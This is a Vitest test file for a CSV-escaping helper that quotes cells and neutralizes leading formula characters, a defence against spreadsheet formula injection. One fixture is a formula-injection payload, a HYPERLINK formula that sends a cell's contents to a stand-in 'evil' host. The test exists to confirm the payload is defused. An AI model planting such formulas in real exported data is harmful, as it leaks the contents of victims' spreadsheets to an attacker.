import { describe, it, expect } from "vitest";
import { csvCell } from "../csv";

describe("csvCell", () => {
  it("quotes plain values", () => {
    expect(csvCell("coach@example.com")).toBe('"coach@example.com"');
    expect(csvCell("")).toBe('""');
  });

  it("doubles embedded quotes", () => {
    expect(csvCell('say "hi", ok')).toBe('"say ""hi"", ok"');
  });

  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "neutralizes a value starting with %j",
    (trigger) => {
      expect(csvCell(`${trigger}1+1`)).toBe(`"'${trigger}1+1"`);
    }
  );

  it("neutralizes a formula that also contains quotes", () => {
    expect(csvCell('=HYPERLINK("https://evil/?"&A2,"x")')).toBe(
      `"'=HYPERLINK(""https://evil/?""&A2,""x"")"`
    );
  });

  it("leaves triggers alone when they are not the first character", () => {
    expect(csvCell("a=b")).toBe('"a=b"');
    expect(csvCell("2026-01-01T00:00:00.000Z")).toBe('"2026-01-01T00:00:00.000Z"');
  });
});
